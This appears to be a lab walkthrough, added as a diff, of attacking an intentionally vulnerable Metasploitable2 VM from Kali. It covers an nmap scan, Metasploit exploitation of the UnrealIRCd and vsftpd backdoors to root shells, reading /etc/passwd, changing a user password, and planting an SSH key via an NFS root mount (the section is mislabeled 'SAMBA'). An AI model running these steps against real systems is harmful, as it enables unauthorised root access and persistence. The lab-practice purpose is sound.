@@ -1,0 +1,133 @@
+We have two machines:
+	- metasploitable2 linux 	192.168.56.101 
+	- kali linux			192.168.56.102
+
+1. Scan ports and search services:
+
+	nmap -p0-65535 192.168.56.101
+
+result:
+
+	Nmap scan report for 192.168.56.101
+	Host is up (0.00063s latency).
+	Not shown: 65506 closed tcp ports (reset)
+	PORT      STATE SERVICE
+	21/tcp    open  ftp
+	22/tcp    open  ssh
+	23/tcp    open  telnet
+	25/tcp    open  smtp
+	53/tcp    open  domain
+	80/tcp    open  http
+	111/tcp   open  rpcbind
+	139/tcp   open  netbios-ssn
+	445/tcp   open  microsoft-ds
+	512/tcp   open  exec
+	513/tcp   open  login
+	514/tcp   open  shell
+	1099/tcp  open  rmiregistry
+	1524/tcp  open  ingreslock
+	2049/tcp  open  nfs
+	2121/tcp  open  ccproxy-ftp
+	3306/tcp  open  mysql
+	3632/tcp  open  distccd
+	5432/tcp  open  postgresql
+	5900/tcp  open  vnc
+	6000/tcp  open  X11
+	6667/tcp  open  irc
+	6697/tcp  open  ircs-u
+	8009/tcp  open  ajp13
+	8180/tcp  open  unknown
+	8787/tcp  open  msgsrvr
+	41902/tcp open  unknown
+	43135/tcp open  unknown
+	48249/tcp open  unknown
+	50533/tcp open  unknown
+
+2. Unintentional Backdoors
+
+msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/bind_perl
+payload => cmd/unix/bind_perl
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.56.101
+RHOST => 192.168.56.101
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
+
+[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 192.168.56.101:6667 - Sending backdoor command...
+[*] Started bind TCP handler against 192.168.56.101:4444
+id
+[*] Command shell session 1 opened (192.168.56.102:35581 -> 192.168.56.101:4444) at 2023-03-14 10:53:42 -0400
+
+uid=0(root) gid=0(root)
+pwd
+/etc/unrea
+
+3. VSFTPd Backdoors
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads
+
+Compatible Payloads
+===================
+
+   #  Name                       Disclosure Date  Rank    Check  Description
+   -  ----                       ---------------  ----    -----  -----------
+   0  payload/cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
+payload => cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.56.101
+RHOST => 192.168.56.101
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.56.101:21 - USER: 331 Please specify the password.
+[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
+[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.56.102:45135 -> 192.168.56.101:6200) at 2023-03-14 10:57:30 -0400
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+....
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+test:x:1003:1003::/home/test:/bin/sh
+test2:x:1004:1004::/home/test2:/bin/bash
+passwd test2
+Enter new UNIX password: 1
+Retype new UNIX password: 1
+passwd: password updated successfully
+^C
+Abort session 1? [y/N]  y
+
+[*] 192.168.56.101 - Command shell session 1 closed.  Reason: User exit
+
+4. SAMBA
+
+┌──(root㉿kali)-[~]
+└─# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa):
+
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+
+                       
+
+mkdir /tmp/r00t
+mount -t nfs 192.168.56.101:/ /tmp/r00t/
+cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
+umount /tmp/r00t
+ssh  -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /root/.ssh/id_rsa root@192.168.56.101               
+
+Last login: Tue Mar 14 00:19:17 2023 from 192.168.56.102
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
